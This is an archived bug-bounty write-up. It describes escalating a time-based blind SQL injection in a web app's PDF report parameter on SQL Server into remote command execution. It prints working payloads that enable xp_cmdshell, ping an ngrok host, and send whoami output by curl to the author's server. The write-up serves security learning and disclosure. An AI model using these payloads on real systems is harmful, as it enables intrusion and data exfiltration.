---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-05-31_sql-injection-to-remote-command-execution-rce.md
original_filename: 2022-05-31_sql-injection-to-remote-command-execution-rce.md
title: SQL injection to Remote Command Execution (RCE)
category: documents
detected_topics:
- sqli
- command-injection
- cloud-security
- mobile-security
tags:
- imported
- documents
- sqli
- command-injection
- cloud-security
- mobile-security
language: en
raw_sha256: 16bba1469dbd7a0f9bd5b8d242f0774de7f1ebe193af6941f670c920e0946a32
text_sha256: 68823b29cf798c4a03485cd4edff288064730f2be1f4a99af8ef27a5f6b52484
ingested_at: '2026-06-28T07:32:11Z'
sensitivity: unknown
redactions_applied: false
---

# SQL injection to Remote Command Execution (RCE)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-05-31_sql-injection-to-remote-command-execution-rce.md
- Source Type: markdown
- Detected Topics: sqli, command-injection, cloud-security, mobile-security
- Ingested At: 2026-06-28T07:32:11Z
- Redactions Applied: False
- Raw SHA256: `16bba1469dbd7a0f9bd5b8d242f0774de7f1ebe193af6941f670c920e0946a32`
- Text SHA256: `68823b29cf798c4a03485cd4edff288064730f2be1f4a99af8ef27a5f6b52484`


## Content

---
title: "SQL injection to Remote Command Execution (RCE)"
url: "https://systemweakness.com/sql-injection-to-remote-command-execution-rce-dd9a75292d1d"
authors: ["Kwadwo Amoako"]
bugs: ["SQL injection", "RCE"]
publication_date: "2022-05-31"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2592
scraped_via: "browseros"
---

# SQL injection to Remote Command Execution (RCE)

1

SQL injection to Remote Command Execution (RCE)
Kwadwo Amoako
Follow
3 min read
·
May 31, 2022

385

9

Hello hackers, before we get into it, I would like to know your view of this — between a hacker’s curiosity and instinct which would you consider a more valuable asset?

Now as the title of this writeup indicates, I would be covering how I leveraged an SQL injection (SQLi) vulnerability on a web application to perform a Remote Command Execution (RCE) on the server hosting the target application. NB: Due to an NDA, I will not be able to disclose the name of the program.

Let's first define what SQLi and RCE are:

What is an SQL Injection: SQL injection, also known as SQLI, is a common attack vector that uses malicious SQL code for backend database manipulation to access information that was not intended to be displayed. -source: Imperva

What is a Remote Command Execution (Command Injection): Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application -source: OWASP

Finding the SQLi vulnerability

While manually going through the pages of the app, I came across a pdf report generating functionality. Nothing seemed out of the ordinary or exploitable except the URLs of the pdf generated pages — they had parameters (see Figure 1).

Press enter or click to view image in full size
Figure 1

I tried triggering errors using the various parameters but none of them worked except one parameter, which produced a 500 error page after I inserted an asterisk *(see Figure 2).

Press enter or click to view image in full size
Figure 2

According to lifewire “The 500 Internal Server Error is a very general HTTP status code that means something has gone wrong on the website’s server, but the server could not be more specific on what the exact problem is.”

Get Kwadwo Amoako’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

I decided to trigger a 10-seconds time-based blind SQLi using the WAITFOR keyword in SQL Server. This resulted in the page returning a response after 12 seconds (12,000 milliseconds) (see Figure 3)

Press enter or click to view image in full size
Figure 3

— for a page that returned results after 2 seconds, I began to feel excited. After using 20 seconds and getting a response after 22 seconds (22,000 milliseconds), I couldn't be more sure of my finding (see Figure 4).

Press enter or click to view image in full size
Figure 4
SQLi to RCE

Now that I was sure that I was dealing with an SQL Server, I leveraged the SQLi vulnerability to enable xp_cmdshell using ; EXEC sp_configure ‘show advanced options’, 1; RECONFIGURE; EXEC sp_configure ‘xp_cmdshell’, 1; RECONFIGURE; — (see Figure 5)

Press enter or click to view image in full size
Figure 5

After enabling the xp_cmdshell, I pinged my http-server using ;EXEC xp_cmdshell ‘ping xxxxxxxx.ngrok.io’; — and got a response. Awseome!

As you can see from the command below, the output of the command in PowerShell is sent to my HTTP server using curl. I used the command whoami, and got the response “nt service\mssqlserver” (see Figures 6 and 7)

;EXEC xp_cmdshell ‘powershell -c “$x = whoami; curl http://xxxxxx.net/get?output=$x"';--

Press enter or click to view image in full size
Figure 6
Press enter or click to view image in full size
Figure 7

In order to prevent this attack, it is important to make use of Parameterized Queries.

As always, your feedback on this write-up will be very much appreciated.

Disclaimer: This write-up is for educational purposes only. I am in no way responsible for its misuse.
